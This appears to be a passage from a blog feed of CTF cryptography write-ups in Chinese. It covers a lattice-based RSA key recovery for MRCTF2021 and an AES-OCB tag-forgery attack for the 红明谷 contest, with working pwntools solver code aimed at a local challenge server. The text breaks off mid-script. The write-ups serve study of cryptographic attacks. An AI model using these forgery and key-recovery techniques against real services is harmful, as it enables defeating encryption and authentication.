Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">7194944829894746935571965271122989443610702698015123026500274312320541540511952275333536082176132102091625202863345739074691901574020649953130369453360247690506566827078013306825941200018330639608298539682191482947557146237487451707849833303794107411686130468587672820352641436722348277258977791778239539008852841749667581869688275892813664557078043533743669277649148468667399393518112220602616186358353262921270486781426670131125521444335280904901224934061164334131460273779473387748722008412594372005590209919098686472153912130124772089012962023984089123929555594332030502775588070235834837667605812843128059372243</span></span><br><span class="line">e = <span class="number">5872666789397408936685003821802975734744078884385553897196686533187747297681714766542317071546532454504513425295170366015384657690105523240363850101369048640430719519784564240908244756652800934680608667950183962226340288720771217107508516125044088043789281574833079766048266075717484676158307477384862873719462770774288252074344824446884295300603035728339571606659365040029505127532956295163195257002051007447197735267997104725561159289832252522298457628452222155625714679911912616173849423059919537353814530280736653541415686756485413316581322357887750268983241858913704388088485132644523120028234659344174431547087</span></span><br><span class="line">c = <span class="number">6601667269134560091452287214083525217696007424340765571114688738279264700361513951309195757650152324371826111195352731779137577044473630747863137747356695892337017953751159248388157498368915463745769509485009626774902347006319659852239932231921393353157319713540010424345134411781723171111939891127671029064626426950125001347122070491553845919803891156107693973027238705710354919725550360159383455222982999904576805089837067774838194257113022653159325313574447189639317397889065351340828031907571541750274329094240472180870714728295651611160552345500801797030280900507979459558944006193012524181456837126192865748097</span></span><br><span class="line">m = <span class="number">114514</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">beta = 0.34</span></span><br><span class="line"><span class="string">delta = 0.02</span></span><br><span class="line"><span class="string">amplification = 2048</span></span><br><span class="line"><span class="string">X = int(pow(n,delta) * (5/2))</span></span><br><span class="line"><span class="string">Y = int(pow(n,(beta+delta)) * (5/2))</span></span><br><span class="line"><span class="string">M = []</span></span><br><span class="line"><span class="string">M.append([n*n*X*X*X,0,0,0])</span></span><br><span class="line"><span class="string">M.append([e*n*X*X*X,-n*X*X*Y,0,0])</span></span><br><span class="line"><span class="string">M.append([e*e*X*X*X,-2*e*X*X*Y,X*Y*Y,0])</span></span><br><span class="line"><span class="string">M.append([e*e*e*X*X*X,-3*e*e*X*X*Y,3*e*X*Y*Y,-Y*Y*Y])</span></span><br><span class="line"><span class="string">M = Matrix(M)</span></span><br><span class="line"><span class="string">A = M.LLL()[0]</span></span><br><span class="line"><span class="string">p = []</span></span><br><span class="line"><span class="string">p.append(A[0]//(X**3))</span></span><br><span class="line"><span class="string">p.append(A[1]//(X^2*Y))</span></span><br><span class="line"><span class="string">p.append(A[2]//(X*Y^2))</span></span><br><span class="line"><span class="string">p.append(A[3]//(Y^3))</span></span><br><span class="line"><span class="string">R.&lt;x,y&gt; = ZZ[]</span></span><br><span class="line"><span class="string">f = x**3*p[0] + x**2*y*p[1] + x*y**2*p[2] + y**3*p[3]</span></span><br><span class="line"><span class="string">f.factor()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(-1) * (144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717*x + 636751972323*y) * (22360612316620576265962363998986325309879295954423979763235633587165509772463851121464450246995467551277856854280313242339679743870302000793124620978436719868879086932947083203923324893801655101558128409321266258664105566594644972878236716985754511292295147466953475408456421662883470405599945529089115443773171753380747253399676451061853675376543473713650224588466737340581901289431253330538396922770846601154595827366651699780258116005162252520473266535156064285895366446187694020122502168871153774940666139567620938830703125690675687869510298889906793*x^2 + 267647155976378743685890593144685469708715653490308593667201283907775452606689307120817149553958120371639890271685148603015657241238590179583153694790949220206995033824074078242830758458739742301161015368049847345525661233185551949155450470189603595130241004416639482696460716023144193868351704190287775402159037407591606868297555272291534131071*x*y - 1177035497855139471300150596073079881470359423070664560562543221821780066461677777154411563960425838478371703085673516387654415520557027*y^2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717</span> + <span class="number">1</span></span><br><span class="line">dq = <span class="number">636751972323</span></span><br><span class="line">q = (e * dq + k - <span class="number">1</span>) // k</span><br><span class="line">p = n // q</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-MRCTF2021-39-s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-MRCTF2021-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for MRCTF2021&amp;#39;</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for 红明谷 crypto</title>
    <link href="http://example.com/2021/04/04/Wp_for_%E7%BA%A2%E6%98%8E%E8%B0%B7_crypto/"/>
    <id>http://example.com/2021/04/04/Wp_for_%E7%BA%A2%E6%98%8E%E8%B0%B7_crypto/</id>
    <published>2021-04-03T17:26:50.000Z</published>
    <updated>2021-04-05T13:54:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-红明谷-39-s-crypto"><a href="#Writeup-for-红明谷-39-s-crypto" class="headerlink" title="Writeup for 红明谷&#39;s crypto"></a>Writeup for 红明谷&#39;s crypto</h1><p>不知道是为啥，只有一个难题，虽然巨难无比，但收获不小</p><h2 id="RSAattack"><a href="#RSAattack" class="headerlink" title="RSAattack"></a>RSAattack</h2><p>$e=3$ $c$ 远小于 $n$ ，直接开方就完了</p><h2 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h2><p>和VNCTF的factor是一个题，换一下数据直接出</p><h2 id="babyFogery"><a href="#babyFogery" class="headerlink" title="babyFogery"></a>babyFogery</h2><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>加密模式为<a href="https://github.com/kravietz/pyOCB">AES.OCB</a>，服务器提供加密和解密功能，<code>getflag</code>的要求如下：</p><ul><li>associate_data为<code>from Alice</code></li><li>明文为<code>please_give_me_the_flag</code></li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>阅读整体代码，掌握AES.OCB模式的特点与加解密过程如下：</p><p>（本文只说明对该题有意义的函数与特点，如果想仔细了解请阅读<code>github</code>上的源代码）</p><blockquote><p>后文中 $E(),D()$ 表示AES.OCB内部的 $aes.encrypt(),aes.decrypt()$</p></blockquote><h4 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h4><p>AES.OCB在解密时会对 $tag$ 与 $cipher$ 进行认证，如果发现与加密时的不同，则不会返回解密后的 明文，所以这一点要求我们在伪造 $cipher$ 和同时要对 $tag$ 进行伪造，使得其通过认证检测，我们才能得到明文，才能保证连接不被中断</p><h4 id="pmac"><a href="#pmac" class="headerlink" title="pmac"></a><strong>pmac</strong></h4><p>是一种加密（或处理）<code>associate_data</code>的函数，其输出结果只与内部 $aes$ 和 $header$ 参数有关</p><h4 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a><strong>encrypt</strong></h4><p>AES.OCB加密函数，对于除去最后一块的前面所有明文块，其满足<br>$$<br>c_i=2^i\cdot E(nonce) \bigoplus E(2^i\cdot E(nonce) \bigoplus m_i)<br>$$<br>而对与最后一块，其满足<br>$$<br>c_n=m_n \bigoplus E(2^n\cdot E(nonce)\bigoplus len(0^n))<br>$$<br>而加密时的 $tag$ 与其他参数，满足<br>$$<br>checksum=\bigoplus^n_{i=1}m_i<br>$$<br>$$<br>tag=E(3\cdot 2^n\cdot E(nonce)\bigoplus checksum)<br>$$<br>另外，如果 $header&gt;0$ ，则新的 $tag=tag\bigoplus header$ ，此外，一个 $nonce$ 只能够被使用一次</p><h4 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a><strong>decrypt</strong></h4><p>AES.OCB解密函数，对于除去最后一块的前面所有明文块，其满足<br>$$<br>m_i=D(c_i\bigoplus 2^i\cdot E(nonce)) \bigoplus 2^i\cdot E(nonce)<br>$$<br>而对与最后一块，其满足<br>$$<br>m_n=c_n \bigoplus E(2^n\cdot E(nonce)\bigoplus len(0^n))<br>$$<br>解密时的 $checktag$ 与其他参数，满足<br>$$<br>checksum=\bigoplus^n_{i=1}m_i<br>$$<br>$$<br>checktag=E(3\cdot 2^n\cdot E(nonce)\bigoplus checksum)<br>$$<br>同样的，如果 $header&gt;0$ ，则新的 $checktag=checktag\bigoplus header$</p><p>如果 $cipher$ 或 $tag$ 被检测出被修改过，则直接返回 $(False,[])$ ，否则返回 $(True,[message])$</p><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>很显然，我们本地无法加密的原因是因为AES.OCB模式内部的 $aes$ 我们无法使用，另外在线的加密函数我们无法使得<code>associate_data</code>为<code>from Alice</code>，所以只要我们能够求出 $msg$ 所对应的 $E(msg)$ ，这个问题就会迎刃而解（任意加密攻击）</p><p>这里我们这样构造<br>$$<br>m_1=len(0^n)=15\times b’\x00’+b’\x80’~~~~~<br>m_2=0=16\times b’\x00’<br>$$</p><p>那么 $m_1$ 会被当作非最后一块加密<br>$$<br>c_1=2\cdot E(nonce)\bigoplus E(2\cdot E(nonce)\bigoplus m_1)<br>$$</p><p>$$<br>c_2=m_2\bigoplus E(4\cdot E(nonce)\bigoplus len(0^n))\<br>=E(4\cdot E(nonce)\bigoplus len(0^n))<br>$$</p><p>随后调用解密函数时只提交 $c1$ ，此时会被当作最后一块解密，那么我们会发现<br>$$<br>m_1=c_1\bigoplus E(2\cdot E(nonce)\bigoplus m_1) \<br>=\underbrace{2\cdot E(nonce)\bigoplus E(2\cdot E(nonce)\bigoplus len(0^n))}_{c_1}\bigoplus E(2\cdot E(nonce)\bigoplus m_1)<br>$$<br>而我们构造的 $m_1=len(0^n)$ ，那么显然 $m_1=2\cdot E(nonce)$ ，此时，我们就能够轻松算出 $E(nonce)$ ！</p><p>但因为AES.OCB的认证特殊性，我们需要使得伪造 $tag$ 来通过认证检测，这里我们选择令 $header$ 为空，那么此时的<br>$$<br>checktag=E(6\cdot E(nonce)\bigoplus 2\cdot E(nonce))\<br>=E(4\cdot E(nonce))<br>$$<br>如何能得到这个玩意呢？</p><p>当我们再次稍微变化一下 $c_1=c_1\bigoplus m1$ 后，我们发现此时<br>$$<br>checktag=E(m_1\bigoplus 6\cdot E(nonce)\bigoplus 2\cdot E(nonce))\<br>=E(m_1\bigoplus 4\cdot E(nonce))=c_2<br>$$<br>也就是说，我们给在线 $decrypt$ 函数提供的数据分别为： $nonce$ 为加密时的 $nonce$ ， $tag$ 为 $c_2$ ， $c = c_1$ ， $header$ 为空，这样就能够成功通过客户端的认证检查，并且得到 $2\cdot E(nonce)$ ，对 $times2$ 函数写个逆即可求得 $E(nonce)$</p><p>此时，我们即可对于任意的 $nonce$ ，都能得到其对应的 $E(nonce)$ ，但是对于任意的明文 $m$ ，并不能自如的完成任意加密，那么我们现在相当于已经有了 $nonce$ 与其对应的 $E(nonce)$ ，如何来完成任意加密的效果呢？</p><p>这里我们为了便于解释，我们记 $L=E(nonce)$ 、$L’=E(2\cdot L\bigoplus m_1)$ ，那么可以轻松算得 $L’=c_1\bigoplus 2\cdot L$ ，我们再次使用客户端的 $encrypt$ 函数，但这次我们的 $nonce=2\cdot L\bigoplus m_1$ ，$m=message\bigoplus2\cdot L’$ ，那么 $c=2\cdot L’\bigoplus E(message\bigoplus2\cdot L’\bigoplus2\cdot L’)$ ，我们就能轻松算出 $E(message)=c\bigoplus 2\cdot L’$</p><p>我们将前面所有的过程看作一个函数，即使用一个 $nonce$ 名额，来得到我想要的 $aes.encrypt(message)$ ，那么此时所有的加密过程都可以在本地完成，直接在本地计算题目所需要的 $cipher$ 与 $tag$ ，直接打给服务器即可</p><p><img src="/img/babyForgerysuccess.png" alt="success"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">times2</span>(<span class="params">input_data,blocksize = <span class="number">16</span></span>):</span></span><br><span class="line">    <span class="keyword">assert</span> len(input_data) == blocksize</span><br><span class="line">    output =  bytearray(blocksize)</span><br><span class="line">    carry = input_data[<span class="number">0</span>] &gt;&gt; <span class="number">7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(input_data) - <span class="number">1</span>):</span><br><span class="line">        output[i] = ((input_data[i] &lt;&lt; <span class="number">1</span>) | (input_data[i + <span class="number">1</span>] &gt;&gt; <span class="number">7</span>)) % <span class="number">256</span></span><br><span class="line">    output[<span class="number">-1</span>] = ((input_data[<span class="number">-1</span>] &lt;&lt; <span class="number">1</span>) ^ (carry * <span class="number">0x87</span>)) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">assert</span> len(output) == blocksize</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">times3</span>(<span class="params">input_data</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> len(input_data) == <span class="number">16</span></span><br><span class="line">    output = times2(input_data)</span><br><span class="line">    output = xor_block(output, input_data)</span><br><span class="line">    <span class="keyword">assert</span> len(output) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back_times2</span>(<span class="params">output_data,blocksize = <span class="number">16</span></span>):</span></span><br><span class="line">    <span class="keyword">assert</span> len(output_data) == blocksize</span><br><span class="line">    input_data =  bytearray(blocksize)</span><br><span class="line">    carry = output_data[<span class="number">-1</span>] &amp; <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(output_data) - <span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        input_data[i] = (output_data[i] &gt;&gt; <span class="number">1</span>) | ((output_data[i<span class="number">-1</span>] % <span class="number">2</span>) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    input_data[<span class="number">0</span>] = (carry &lt;&lt; <span class="number">7</span>) | (output_data[<span class="number">0</span>] &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(carry)</span></span><br><span class="line">    <span class="keyword">if</span>(carry):</span><br><span class="line">        input_data[<span class="number">-1</span>] = ((output_data[<span class="number">-1</span>] ^ (carry * <span class="number">0x87</span>)) &gt;&gt; <span class="number">1</span>) | ((output_data[<span class="number">-2</span>] % <span class="number">2</span>) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">assert</span> len(input_data) == blocksize</span><br><span class="line">    <span class="keyword">return</span> input_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_block</span>(<span class="params">input1, input2</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> len(input1) == len(input2)</span><br><span class="line">    output = bytearray()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(input1)):</span><br><span class="line">        output.append(input1[i] ^ input2[i])</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_bytes</span>(<span class="params">input</span>):</span></span><br><span class="line">    <span class="keyword">return</span> bytearray(long_to_bytes(int(input,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter username &gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Arbitrary_encrypt</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="comment"># to get aes.encrypt(msg)</span></span><br><span class="line"></span><br><span class="line">    num = bytearray(os.urandom(<span class="number">16</span>))</span><br><span class="line">    <span class="comment"># encrypt &quot;\x00&quot;*15+&quot;\x80&quot;+&quot;\x00&quot;*16</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">    r.sendline(num.hex())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter message &gt; &quot;</span>)</span><br><span class="line">    m = bytearray(<span class="string">b&quot;\x00&quot;</span>*<span class="number">15</span> + <span class="string">b&quot;\x80&quot;</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line">    r.sendline(m.hex())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;ciphertext: &quot;</span>)</span><br><span class="line">    cipher = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;tag: &quot;</span>)</span><br><span class="line">    tag = r.recvline(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># decrypt to solve L=E(nonce)</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">    r.sendline(num.hex())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter ciphertext &gt; &quot;</span>)</span><br><span class="line">    m0 = bytearray(<span class="string">b&quot;\x00&quot;</span>*<span class="number">15</span> + <span class="string">b&quot;\x80&quot;</span>)</span><br><span class="line">    m1 = bytearray(<span class="string">b&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line">    c0 = hex_to_bytes(cipher[:<span class="number">32</span>])</span><br><span class="line">    r.sendline(xor_block(c0,m0).hex())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter tag &gt; &quot;</span>)</span><br><span class="line">    c1 = cipher[<span class="number">32</span>:]</span><br><span class="line">    r.sendline(c1)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter associate data &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;message: &quot;</span>)</span><br><span class="line">    enc = xor_block(bytearray(hex_to_bytes(r.recvline(<span class="literal">False</span>))),m0)</span><br><span class="line"></span><br><span class="line">    L = back_times2(enc)</span><br><span class="line">    LL = enc</span><br><span class="line">    LLL = xor_block(LL,c0)</span><br><span class="line">    <span class="comment"># print(L)</span></span><br><span class="line">    <span class="comment"># print(LL)</span></span><br><span class="line">    <span class="comment"># print(LLL)</span></span><br><span class="line">    <span class="comment"># L=L 2L=LL L&#x27;=LLL m0=m0</span></span><br><span class="line">    msg = bytearray(msg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encrypt msg</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">    r.sendline(xor_block(LL,m0).hex())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter message &gt; &quot;</span>)</span><br><span class="line">    r.sendline(xor_block(msg,times2(LLL)).hex()+m1.hex())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;ciphertext: &quot;</span>)</span><br><span class="line">    enc = bytearray(hex_to_bytes(r.recvline(<span class="literal">False</span>))[:<span class="number">16</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> xor_block(enc,times2(LLL))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_pmac</span>(<span class="params">header, blocksize = <span class="number">16</span></span>):</span></span><br><span class="line">    <span class="keyword">assert</span> len(header)</span><br><span class="line">    m = int(max(<span class="number">1</span>, math.ceil(len(header) / float(blocksize))))</span><br><span class="line">    offset = Arbitrary_encrypt(bytearray([<span class="number">0</span>] * blocksize))</span><br><span class="line">    offset = times3(offset)</span><br><span class="line">    offset = times3(offset)</span><br><span class="line">    checksum = bytearray(blocksize)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m - <span class="number">1</span>):</span><br><span class="line">        offset = times2(offset)</span><br><span class="line">        H_i = header[(i * blocksize):(i * blocksize) + blocksize]</span><br><span class="line">        <span class="keyword">assert</span> len(H_i) == blocksize</span><br><span class="line">        xoffset = xor_block(H_i, offset)</span><br><span class="line">        encrypted = Arbitrary_encrypt(xoffset)</span><br><span class="line">        checksum = xor_block(checksum, encrypted)</span><br><span class="line">    offset = times2(offset)</span><br><span class="line">    H_m = header[((m - <span class="number">1</span>) * blocksize):]</span><br><span class="line">    <span class="keyword">assert</span> len(H_m) &lt;= blocksize</span><br><span class="line">    <span class="keyword">if</span> len(H_m) == blocksize:</span><br><span class="line">        offset = times3(offset)</span><br><span class="line">        checksum = xor_block(checksum, H_m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        H_m.append(int(<span class="string">&#x27;10000000&#x27;</span>, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">while</span> len(H_m) &lt; blocksize:</span><br><span class="line">            H_m.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">assert</span> len(H_m) == blocksize</span><br><span class="line">        </span><br><span class="line">        checksum = xor_block(checksum, H_m)</span><br><span class="line">        offset = times3(offset)</span><br><span class="line">        offset = times3(offset)</span><br><span class="line">    final_xor = xor_block(offset, checksum)</span><br><span class="line">    auth = Arbitrary_encrypt(final_xor)</span><br><span class="line">    <span class="keyword">return</span> auth</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_ocb_encrypt</span>(<span class="params">plaintext, header, nonce, blocksize = <span class="number">16</span></span>):</span></span><br><span class="line">    <span class="keyword">assert</span> nonce</span><br><span class="line">    m = int(max(<span class="number">1</span>, math.ceil(len(plaintext) / float(blocksize))))</span><br><span class="line">    offset = Arbitrary_encrypt(nonce)</span><br><span class="line">    checksum = bytearray(blocksize)</span><br><span class="line">    ciphertext = bytearray()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m - <span class="number">1</span>):</span><br><span class="line">        offset = times2(offset)</span><br><span class="line">        M_i = plaintext[(i * blocksize):(i * blocksize) + blocksize]</span><br><span class="line">        <span class="keyword">assert</span> len(M_i) == blocksize</span><br><span class="line">        checksum = xor_block(checksum, M_i)</span><br><span class="line">        xoffset = Arbitrary_encrypt(xor_block(M_i, offset))</span><br><span class="line">        ciphertext += xor_block(offset, xoffset)</span><br><span class="line">        <span class="keyword">assert</span> len(ciphertext) % blocksize == <span class="number">0</span></span><br><span class="line">    M_m = plaintext[((m - <span class="number">1</span>) * blocksize):]</span><br><span class="line">    offset = times2(offset)</span><br><span class="line">    bitlength = len(M_m) * <span class="number">8</span></span><br><span class="line">    <span class="keyword">assert</span> bitlength &lt;= blocksize * <span class="number">8</span></span><br><span class="line">    tmp = bytearray(blocksize)</span><br><span class="line">    tmp[<span class="number">-1</span>] = bitlength</span><br><span class="line">    pad = Arbitrary_encrypt(xor_block(tmp, offset))</span><br><span class="line">    tmp = bytearray()</span><br><span class="line">    C_m = xor_block(M_m, pad[:len(M_m)])</span><br><span class="line">    ciphertext += C_m</span><br><span class="line">    tmp = M_m + pad[len(M_m):]</span><br><span class="line">    <span class="keyword">assert</span> len(tmp) == blocksize</span><br><span class="line">    checksum = xor_block(tmp, checksum)</span><br><span class="line">    offset = times3(offset)</span><br><span class="line">    tag = Arbitrary_encrypt(xor_block(checksum, offset))</span><br><span class="line">    <span class="keyword">if</span> len(header) &gt; <span class="number">0</span>:</span><br><span class="line">        tag = xor_block(tag, my_pmac(header))</span><br><span class="line">    <span class="keyword">return</span> (tag, ciphertext)</span><br><span class="line"></span><br><span class="line">finalnonce = bytearray(hex_to_bytes(<span class="string">&#x27;11&#x27;</span>*<span class="number">16</span>))</span><br><span class="line">finaltag,finalcipher = (my_ocb_encrypt(bytearray(<span class="string">b&#x27;please_give_me_the_flag&#x27;</span>),bytearray(<span class="string">b&#x27;from Alice&#x27;</span>),finalnonce))</span><br><span class="line"></span><br><span 